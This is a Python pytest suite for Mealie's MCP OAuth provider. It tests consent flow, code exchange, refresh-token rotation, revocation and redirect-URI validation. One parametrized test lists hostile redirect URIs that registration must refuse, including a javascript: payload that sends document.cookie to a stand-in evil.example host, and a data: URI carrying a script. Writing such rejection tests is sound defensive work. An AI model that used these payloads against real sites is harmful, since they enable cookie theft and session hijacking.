import asyncio
import contextlib
from datetime import timedelta
from urllib.parse import parse_qs, urlparse

import pytest
from mcp.server.auth.provider import (
    AccessToken,
    AuthorizationParams,
    AuthorizeError,
    RegistrationError,
    TokenError,
)
from mcp.shared.auth import OAuthClientInformationFull
from sqlalchemy import update
from sqlalchemy.orm import Session

from mealie.core.config import get_app_settings
from mealie.db.models._model_utils.datetime import get_utc_now
from mealie.db.models.users.users import User
from mealie.mcp.oauth import store as store_module
from mealie.mcp.oauth import tokens
from mealie.mcp.oauth.provider import MealieOAuthProvider, UnsafeRedirectError
from mealie.mcp.oauth.store import OAuthStore
from mealie.mcp.scopes import ALL_SCOPES
from tests.utils.factories import random_string

CALLBACK = "https://claude.ai/api/mcp/auth_callback"


def _client(redirect_uri: str = CALLBACK) -> OAuthClientInformationFull:
    return OAuthClientInformationFull(
        client_id=random_string(),
        client_name="Claude",
        redirect_uris=[redirect_uri],
        token_endpoint_auth_method="none",
    )


def _params(scopes: list[str] | None = None, redirect_uri: str = CALLBACK) -> AuthorizationParams:
    return AuthorizationParams(
        state="s1",
        scopes=scopes,
        code_challenge="challenge",
        redirect_uri=redirect_uri,
        redirect_uri_provided_explicitly=True,
        resource="https://mealie.example/mcp",
    )


def _provider(session: Session) -> MealieOAuthProvider:
    return MealieOAuthProvider(session_factory=lambda: contextlib.nullcontext(session))


def _query(url: str) -> dict[str, str]:
    return {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}


async def _issue_tokens(provider: MealieOAuthProvider, client, user_id: str, scopes: list[str]):
    url = await provider.authorize(client, _params(scopes))
    redirect = provider.complete_authorization(_query(url)["request_id"], user_id, approve=True)
    code = await provider.load_authorization_code(client, _query(redirect)["code"])
    assert code is not None
    return await provider.exchange_authorization_code(client, code)


def test_authorize_returns_consent_url_with_request_id(session: Session):
    provider = _provider(session)
    client = _client()

    url = asyncio.run(provider.authorize(client, _params(["recipes:read"])))

    parsed = urlparse(url)
    assert url.startswith(get_app_settings().BASE_URL.rstrip("/"))
    assert parsed.path.endswith("/user/connections/authorize")
    request_id = _query(url)["request_id"]
    pending = OAuthStore(session).peek_pending(request_id)
    assert pending is not None and pending[0] == client.client_id


def test_authorize_defaults_to_all_scopes(session: Session):
    provider = _provider(session)

    url = asyncio.run(provider.authorize(_client(), _params(None)))

    pending = OAuthStore(session).peek_pending(_query(url)["request_id"])
    assert pending is not None
    assert pending[1].scopes == list(ALL_SCOPES)


def test_complete_authorization_denied_redirects_with_error(session: Session, unique_user):
    provider = _provider(session)
    url = asyncio.run(provider.authorize(_client(), _params(["recipes:read"])))
    request_id = _query(url)["request_id"]

    redirect = provider.complete_authorization(request_id, str(unique_user.user_id), approve=False)

    query = _query(redirect)
    assert redirect.startswith(CALLBACK)
    assert query == {"error": "access_denied", "state": "s1"}
    with pytest.raises(KeyError):
        provider.complete_authorization(request_id, str(unique_user.user_id), approve=True)


def test_full_code_exchange_yields_tokens_and_grant(session: Session, unique_user):
    provider = _provider(session)
    client = _client()
    user_id = str(unique_user.user_id)

    token = asyncio.run(_issue_tokens(provider, client, user_id, ["recipes:read", "recipes:write"]))

    assert token.token_type == "Bearer"
    assert token.expires_in == 3600
    assert token.scope == "recipes:read recipes:write"
    assert token.refresh_token
    claims = tokens.decode_access_token(token.access_token)
    assert claims is not None
    assert claims.sub == user_id
    assert claims.cid == client.client_id
    assert claims.scope == ["recipes:read", "recipes:write"]
    grant = OAuthStore(session).get_grant(claims.gid)
    assert grant is not None and str(grant.user_id) == user_id

    access = asyncio.run(provider.load_access_token(token.access_token))
    assert access is not None and access.subject == user_id and access.scopes == claims.scope


def test_code_cannot_be_exchanged_twice(session: Session, unique_user):
    provider = _provider(session)
    client = _client()

    async def run():
        url = await provider.authorize(client, _params(["recipes:read"]))
        redirect = provider.complete_authorization(_query(url)["request_id"], str(unique_user.user_id), approve=True)
        code = await provider.load_authorization_code(client, _query(redirect)["code"])
        assert code is not None
        await provider.exchange_authorization_code(client, code)
        with pytest.raises(TokenError) as exc:
            await provider.exchange_authorization_code(client, code)
        assert exc.value.error == "invalid_grant"
        assert await provider.load_authorization_code(client, code.code) is None

    asyncio.run(run())


def test_refresh_rotation_and_replay_revokes(session: Session, unique_user, monkeypatch):
    provider = _provider(session)
    client = _client()

    async def run():
        first = await _issue_tokens(provider, client, str(unique_user.user_id), ["recipes:read", "recipes:write"])
        old = await provider.load_refresh_token(client, first.refresh_token)
        assert old is not None

        with pytest.raises(TokenError) as exc:
            await provider.exchange_refresh_token(client, old, ["admin:all"])
        assert exc.value.error == "invalid_scope"

        second = await provider.exchange_refresh_token(client, old, [])
        assert second.refresh_token != first.refresh_token
        assert second.scope == "recipes:read recipes:write"
        assert await provider.load_access_token(second.access_token) is not None

        # the SDK handler loads before exchanging: a rotated token reused after the grace window kills the grant
        frozen = get_utc_now() + tokens.REFRESH_REUSE_GRACE + timedelta(seconds=1)
        monkeypatch.setattr(store_module, "_now", lambda: frozen)
        assert await provider.load_refresh_token(client, first.refresh_token) is None
        assert await provider.load_access_token(second.access_token) is None
        assert await provider.load_refresh_token(client, second.refresh_token) is None

    asyncio.run(run())


def test_load_access_token_none_after_revoke(session: Session, unique_user):
    provider = _provider(session)
    client = _client()

    async def run():
        token = await _issue_tokens(provider, client, str(unique_user.user_id), ["recipes:read"])
        access = await provider.load_access_token(token.access_token)
        assert isinstance(access, AccessToken)

        await provider.revoke_token(access)

        assert await provider.load_access_token(token.access_token) is None
        assert await provider.load_refresh_token(client, token.refresh_token) is None
        assert await provider.load_access_token("garbage") is None

    asyncio.run(run())


def test_revoke_refresh_token_revokes_grant(session: Session, unique_user):
    provider = _provider(session)
    client = _client()

    async def run():
        token = await _issue_tokens(provider, client, str(unique_user.user_id), ["recipes:read"])
        refresh = await provider.load_refresh_token(client, token.refresh_token)
        assert refresh is not None

        await provider.revoke_token(refresh)

        assert await provider.load_access_token(token.access_token) is None

    asyncio.run(run())


def test_register_and_get_client(session: Session):
    provider = _provider(session)
    client = _client()

    async def run():
        assert await provider.get_client(client.client_id) is None
        await provider.register_client(client)
        assert await provider.get_client(client.client_id) == client

    asyncio.run(run())


def test_authorize_rejects_unknown_scope(session: Session):
    with pytest.raises(AuthorizeError) as exc:
        asyncio.run(_provider(session).authorize(_client(), _params(["bogus:scope"])))
    assert exc.value.error == "invalid_scope"


def test_malformed_user_id_does_not_burn_pending(session: Session):
    provider = _provider(session)
    url = asyncio.run(provider.authorize(_client(), _params(["recipes:read"])))
    request_id = _query(url)["request_id"]

    with pytest.raises(ValueError):
        provider.complete_authorization(request_id, "not-a-uuid", approve=True)

    assert OAuthStore(session).peek_pending(request_id) is not None


def test_code_client_mismatch_does_not_burn_code(session: Session, unique_user):
    provider = _provider(session)
    client = _client()

    async def run():
        url = await provider.authorize(client, _params(["recipes:read"]))
        redirect = provider.complete_authorization(_query(url)["request_id"], str(unique_user.user_id), approve=True)
        code = await provider.load_authorization_code(client, _query(redirect)["code"])
        assert code is not None
        with pytest.raises(TokenError):
            await provider.exchange_authorization_code(_client(), code)
        assert await provider.load_authorization_code(client, code.code) is not None

    asyncio.run(run())


def test_refresh_retry_within_grace_window_keeps_connection(session: Session, unique_user):
    provider = _provider(session)
    client = _client()

    async def run():
        first = await _issue_tokens(provider, client, str(unique_user.user_id), ["recipes:read"])
        old = await provider.load_refresh_token(client, first.refresh_token)
        assert old is not None
        second = await provider.exchange_refresh_token(client, old, [])

        # the same token again right away (lost response, parallel refresh): refused, grant kept
        assert await provider.load_refresh_token(client, first.refresh_token) is None
        with pytest.raises(TokenError) as exc:
            await provider.exchange_refresh_token(client, old, [])
        assert exc.value.error == "invalid_grant"

        assert await provider.load_access_token(second.access_token) is not None
        successor = await provider.load_refresh_token(client, second.refresh_token)
        assert successor is not None
        assert (await provider.exchange_refresh_token(client, successor, [])).access_token

    asyncio.run(run())


@pytest.mark.parametrize(
    "redirect_uri",
    [
        "javascript:fetch('//evil.example/?'+document.cookie)//",
        "data:text/html,<script>alert(1)</script>",
        "http://evil.example/cb",
        "ftp://evil.example/cb",
        "myapp://callback",
    ],
)
def test_register_rejects_unsafe_redirect_uri(session: Session, redirect_uri: str):
    provider = _provider(session)
    client = _client(redirect_uri)

    with pytest.raises(RegistrationError) as exc:
        asyncio.run(provider.register_client(client))

    assert exc.value.error == "invalid_redirect_uri"
    assert OAuthStore(session).get_client(client.client_id) is None


@pytest.mark.parametrize(
    "redirect_uri",
    [CALLBACK, "http://127.0.0.1:1234/cb", "http://localhost:8080/cb", "http://[::1]:9000/cb"],
)
def test_register_accepts_https_and_loopback(session: Session, redirect_uri: str):
    provider = _provider(session)
    client = _client(redirect_uri)

    asyncio.run(provider.register_client(client))

    assert asyncio.run(provider.get_client(client.client_id)) == client


def test_get_client_hides_legacy_unsafe_client(session: Session):
    client = _client("javascript:alert(1)//")
    OAuthStore(session).save_client(client)  # as if registered before validation existed

    assert asyncio.run(_provider(session).get_client(client.client_id)) is None


@pytest.mark.parametrize("approve", [True, False])
def test_complete_authorization_refuses_stored_unsafe_redirect(session: Session, unique_user, approve: bool):
    store = OAuthStore(session)
    request_id = store.create_pending("legacy", _params(["recipes:read"], redirect_uri="javascript:alert(1)//"))

    with pytest.raises(UnsafeRedirectError):
        _provider(session).complete_authorization(request_id, str(unique_user.user_id), approve=approve)

    assert store.peek_pending(request_id) is None


def test_password_change_invalidates_access_and_refresh(session: Session, unique_user_fn_scoped):
    user = unique_user_fn_scoped
    provider = _provider(session)
    client = _client()

    async def run():
        token = await _issue_tokens(provider, client, str(user.user_id), ["recipes:read"])
        assert await provider.load_access_token(token.access_token) is not None
        refresh = await provider.load_refresh_token(client, token.refresh_token)
        assert refresh is not None

        session.execute(
            update(User).where(User.id == user.user_id).values(tokens_valid_after=get_utc_now() + timedelta(seconds=1))
        )
        session.commit()

        assert await provider.load_access_token(token.access_token) is None
        assert await provider.load_refresh_token(client, token.refresh_token) is None
        with pytest.raises(TokenError) as exc:
            await provider.exchange_refresh_token(client, refresh, [])
        assert exc.value.error == "invalid_grant"

    asyncio.run(run())
